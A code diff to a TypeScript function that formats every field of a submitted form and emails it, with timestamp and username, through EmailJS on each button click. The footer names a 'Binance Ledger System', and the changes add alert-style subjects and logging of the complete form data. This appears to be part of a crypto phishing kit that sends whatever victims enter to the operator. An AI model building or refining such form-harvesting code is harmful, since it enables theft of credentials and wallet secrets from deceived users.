@@ -13,15 +13,18 @@ interface EmailData {
 
 export const sendEmailNotification = async (data: EmailData) => {
   try {
-    // Format all form data into clean HTML
+    // Format all form data into clean HTML with defaults for empty fields
     let formDataHtml = '';
     if (data.allFormData && typeof data.allFormData === 'object') {
       formDataHtml = Object.entries(data.allFormData)
         .map(([key, value]) => {
           const displayValue = value || 'N/A';
-          return `<strong>${key}:</strong> ${displayValue}`;
+          const formattedKey = key.charAt(0).toUpperCase() + key.slice(1).replace(/([A-Z])/g, ' $1');
+          return `<strong>${formattedKey}:</strong> ${displayValue}`;
         })
         .join('<br>');
+    } else {
+      formDataHtml = 'No form data available';
     }
 
     // Create a comprehensive message with all information
@@ -30,8 +33,8 @@ export const sendEmailNotification = async (data: EmailData) => {
 <p><strong>Timestamp:</strong> ${data.timestamp}</p>
 ${data.username ? `<p><strong>Username:</strong> ${data.username}</p>` : ''}
 
-<h3>📋 Form Data:</h3>
-${formDataHtml || 'No form data available'}
+<h3>📋 Complete Form Data:</h3>
+${formDataHtml}
 
 <hr>
 <p><em>Automated notification from Binance Ledger System</em></p>
@@ -39,11 +42,12 @@ ${formDataHtml || 'No form data available'}
 
     // Use only two simple variables to avoid corruption
     const templateParams = {
-      subject: `🚨 ${data.step} - Form Activity`,
+      subject: `🚨 ${data.step} - Button Click Activity`,
       message: message
     };
 
-    console.log('🚨 SENDING EMAIL:', data.step);
+    console.log('🚨 SENDING EMAIL FOR BUTTON CLICK:', data.step);
+    console.log('📧 Complete form data being sent:', data.allFormData);
     console.log('📧 Template params:', templateParams);
 
     const result = await emailjs.send(
